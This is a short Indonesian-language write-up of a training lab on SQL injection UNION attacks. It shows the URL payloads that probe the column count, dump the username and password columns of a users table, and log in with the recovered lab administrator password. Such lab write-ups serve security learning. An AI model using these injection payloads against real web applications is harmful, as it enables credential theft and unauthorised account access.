##  Write-up: SQL injection UNION attack, retrieving data from other tables

### Langkah Pengerjaan:

1. **Masuk ke lab** lalu pilih salah satu kategori produk (misalnya *Corporate gifts*).
   Request GET akan terlihat seperti:

   ```
   /filter?category=Corporate
   ```

2. **Uji SQL Injection** dengan menambahkan payload `UNION SELECT` sederhana:

   ```
   /filter?category='+UNION+SELECT+'a','a'--
   ```

   → Hasil: halaman menampilkan `a` → artinya query berhasil dieksekusi dan ada **2 kolom teks** yang bisa ditampilkan.
   <img width="1910" height="777" alt="Screenshot 2025-09-11 102449" src="https://github.com/user-attachments/assets/57a19a6b-0a92-4394-a5a0-44524c4e0bc3" />


4. **Ambil data dari tabel `users`** dengan payload berikut:

   ```
   /filter?category='+UNION+SELECT+username,password+FROM+users--
   ```
   → Hasil: semua daftar **username** dan **password** muncul di halaman.
  
<img width="1910" height="939" alt="Screenshot 2025-09-11 102631" src="https://github.com/user-attachments/assets/1c3d4c49-1b33-4cd3-8faa-4f50d81f8764" />

5. **Cari kredensial administrator** dari output:

   ```
   administrator : kkbr8tkqhsul3p96e0ys
   ```

6. **Login ke aplikasi** dengan username `administrator` dan password `kkbr8tkqhsul3p96e0ys`.

 **Lab solved** — berhasil login sebagai administrator.
<img width="905" height="512" alt="Screenshot 2025-09-11 102903" src="https://github.com/user-attachments/assets/32365e14-1c2b-409c-8343-2e8378cf57b7" />


